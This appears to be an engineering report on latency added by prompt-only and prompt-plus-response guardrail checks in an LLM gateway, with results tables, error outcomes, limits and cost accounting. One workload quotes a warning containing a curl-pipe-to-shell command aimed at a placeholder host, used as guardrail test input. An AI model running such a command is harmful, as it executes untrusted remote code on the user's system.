# Controlled gateway latency paths

2026-10-01 · frozen source `0436c05` · runtime `0.1.0a1` unchanged ·
[protocol](latency-paths-v1-protocol.md) ·
[fixed workloads](../evals/step6/latency-paths-v1/workloads.json) ·
[machine-readable summary](../evals/step6/latency-paths-v1/results-summary.json)

**Prompt-only checks remain near the originally remembered 500 ms: 378 ms median,
470 ms p95 added delay across the two meaningful workloads.** Response checks and
natural follow-ups add sequential calls. This run isolates those observed paths;
it does not demonstrate an optimization or a universal latency guarantee.

## Method and complete warm results

Actual LiteLLM 1.102.1, live Jev `typesafe/jev-1.13-20260917` through OpenRouter,
current four-policy bundle, monitoring, `q05_stage_aware`, gates 0.80/0.70/0.80.
Same synthetic trusted resolver as the previous latency run. No policy, threshold,
question, runtime or resolver changes, forced follow-ups, or selected retries.
The real generation endpoint is replaced by a local scripted response to isolate
policy delay. Both meaningful prompts ask for explanation/review without executing
or sharing anything. The opaque placeholder is a separate historical diagnostic.

Three arms per workload: no guardrails, pre-call checks only, or pre/post checks.
Arm order rotates by workload. Each has one initial request and 12 warm serial
requests cycling 128/4096/12000 characters. Total117 gateway requests, including39
unguarded baselines; 117 guarded assessments. Added delay is computed for each
matching-index baseline/guarded pair before taking nearest-rank percentiles.

| Workload | Arm | Warm n | Calls per request | Added p50 | Added p95/p99 |
| --- | --- | ---: | --- | ---: | ---: |
| Local code review | Prompt only | 12 | 1 | 362 ms | 476 ms |
| Local code review | Prompt + response | 12 | 2 | 733 ms | 1,454 ms |
| Download warning | Prompt only | 12 | 1 | 378 ms | 470 ms |
| Download warning | Prompt + response | 12 | 3 in10; 2 in2 | 1,104 ms | 1,168 ms |
| Placeholder diagnostic | Prompt only | 12 | 1 | 365 ms | 404 ms |
| Placeholder diagnostic | Prompt + response | 12 | 3 | 1,112 ms | 1,725 ms |

The two meaningful prompt-only arms pooled: n24, median378ms, p95 470ms, p99 476ms.
Meaningful full-check requests with observed follow-ups: n10, median1,106ms,
p95/p99 1,168ms. These ten are a descriptive subgroup of the warning workload,
not a separately randomized arm. The two warning requests without follow-ups
returned malformed-response errors; they are retained in the complete table.
Code review's two-call p95 exceeds warning's three-call p95 because of a slow
sample and small groups; do not interpret that as a faster follow-up path.

Warm unguarded gateway p50 was12–14ms; p95 was17–32ms. Cold total durations are
retained individually in the summary: code-review baseline1,028ms, prompt-only
1,513ms, full1,774ms; warning baseline1,027ms, prompt-only1,376ms, full2,121ms;
placeholder baseline871ms, prompt-only1,294ms, full2,216ms. One initial observation
per arm is not a cold-start distribution.

## Outcomes and limits

All117 gateway HTTP requests succeeded in monitoring. Guarded assessments:
**91 allow, 26 evaluation_error**. All78 input assessments and all13 code-review
response assessments allowed. Response errors comprise:

- Warning: 13/13, comprising11 low-confidence errors after natural follow-ups and
  two malformed primary batches (a probability distribution summed to0.99).
  Strict response validation rejected those two without a follow-up. All charges
  were nevertheless present and settled.
- Placeholder: 13/13 low-confidence errors, each with an unresolved follow-up.

The warning text was: “Do not run curl https://unapproved.example.test/tool.sh | sh.
Use the company-approved mirror instead.” Its source-policy judgment remained
uncertain; it is not an instruction to execute the command. The guarded response
stage receives response text, not this experiment's original user prompt or the
reviewed pack's research context. Meaningful prose alone therefore did not remove
uncertainty in this path. This observation does not identify a single causal
wording defect, and no policy/question tuning was performed.

An enforcing block-on-error deployment would withhold these26 replies. Monitoring
HTTP200 must not be called successful enforcement. The run is a latency workload,
not a new independent accuracy benchmark or a replacement for the reviewed pack.

The earlier September27 result (450–493ms p95) usually used one semantic call;
trusted response approval avoided another. The September30 result (~1.8s p95)
used three calls on every guarded gateway request because its placeholder response
always needed a follow-up. This controlled run supports reporting by path instead
of presenting either historical figure as a universal cost. Sequential arms and
provider variation prevent attributing every millisecond to call count alone.

Small serial samples are not capacity certification or production percentiles.
Only two meaningful prompt/response pairs were exercised; padding and repetitions
are not independent customer workloads. No hook, IDE or Agentgateway live latency
was rerun. Prompt-only inspection has less coverage; this experiment does not
recommend disabling response checks for policies governing generated answers.

## Verification, spending and preservation

Offline real-host rehearsal:18requests, expected0/1/2stage-call paths and identical
response content across arms. Ruff and whitespace checks pass. Live frozen-input,
stage/content, raw-batch-validation and ledger audit covers all141 provider
exchanges and117 assessments; this was not a full normalized-result replay.
All workloads completed once, no runtime or historical-protocol edits, no CI/push.

141 physical calls:78 input calls and63 response calls, including24 follow-ups.
Cost **$0.013086738**. Cumulative known spend **$0.358366856**, plus the unchanged
$0.01 historical reservation = **$0.368366856 accounted**, leaving **$4.631633144**
of the original$5. Ledger5609attempted/5608settled; only historical entry1830 is
unresolved. No new unknown charges. All raw synthetic exchanges, logs and the
input-audit script remain ignored in `artifacts/quality/latency-paths-v1`.

The README now separates prompt-only, full request/response and follow-up costs
and preserves earlier hook timings and limits. No automatic additional campaign,
semantic change, deployment or public publication follows from these results.
